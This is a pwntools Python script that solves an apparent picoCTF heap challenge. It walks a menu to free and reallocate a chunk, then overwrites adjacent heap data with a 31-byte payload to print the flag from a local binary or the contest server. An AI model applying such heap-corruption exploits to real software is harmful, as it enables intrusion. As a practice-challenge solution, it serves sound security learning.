#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else: 
        r = remote("tethys.picoctf.net", 53908)

    return r


def main():
    r = conn()

    r.sendlineafter(b'choice: ', b'5')
    r.sendlineafter(b'choice: ', b'2')

    r.sendlineafter(b'allocation: ', b'35')
    r.sendlineafter(b'flag: ', b'A'*30 + b'p')
    r.sendlineafter(b'choice: ', b'4')

    print(r.recvuntil(b'}'))

if __name__ == "__main__":
    main()
